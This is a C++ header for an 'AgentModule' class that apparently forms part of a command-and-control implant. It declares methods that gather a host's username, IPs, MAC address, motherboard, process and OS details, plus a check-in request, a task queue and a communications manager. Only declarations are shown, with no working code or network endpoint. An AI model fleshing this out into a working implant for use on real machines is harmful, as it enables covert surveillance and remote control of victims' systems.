#pragma once
#include <string>
#include "CommManager.h"
#include "TaskQueueManager.h"
#include <windows.h>

class AgentModule {
public:
	AgentModule();
	BOOL GetUsername(OUT LPWSTR* szWhoamiStr);
	std::string GetInternalIP();
	std::string GetExternalViaDNS();
	int GetPID();
	std::string GetProcessName();
	std::string GetMachineMacAddress();
	std::string GetMotherBoard();
	std::string GetOSVersion();
	void Start();
private:
	CommManager commManager;
	TaskQueueManager taskManager;
	IntitalCheckinRequest GetHostInformation();
};